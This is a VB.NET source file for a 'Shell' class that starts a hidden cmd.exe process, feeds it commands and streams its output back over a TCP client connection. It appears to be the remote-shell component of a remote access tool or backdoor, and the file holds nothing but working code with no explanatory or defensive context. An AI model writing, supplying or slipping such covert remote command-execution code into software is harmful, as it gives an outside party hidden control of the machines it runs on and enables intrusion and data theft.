Public Class Shell
    Dim p As Process
    Dim thread As System.Threading.Thread
    Dim mClient As Net.Sockets.TcpClient
    Public Sub New(ByVal Cl As Net.Sockets.TcpClient)
        mClient = Cl
    End Sub
    Public Sub Start()
        p = New Process
        p.StartInfo.FileName = "cmd"
        p.StartInfo.Arguments = "cd\" 'Nothings
        p.StartInfo.CreateNoWindow = True
        p.StartInfo.UseShellExecute = False
        p.StartInfo.RedirectStandardError = True
        p.StartInfo.RedirectStandardInput = True
        p.StartInfo.RedirectStandardOutput = True
        p.Start()
        thread = New System.Threading.Thread(AddressOf Reading)
        thread.IsBackground = True
        thread.Start()
    End Sub
    Public Sub ExecuteCommand(ByVal Command As String)
        Try
            p.StandardInput.WriteLine(Command)
            p.StandardInput.Flush()
        Catch ex As Exception
            'MsgBox(ex.Message)
        End Try
    End Sub
    Sub Reading()
        While True
            Try
                Dim output As String = p.StandardOutput.ReadLine
                If output <> "" Then
                    Dim wr As New IO.StreamWriter(mClient.GetStream)
                    wr.WriteLine(output)
                    wr.Flush()
                End If
            Catch ex As Exception
                'MsgBox(ex.Message)
            End Try
        End While
    End Sub
    Sub [Stop]()
        Try
            p.Kill()
            thread.Abort()
        Catch ex As Exception

        End Try
    End Sub
End Class

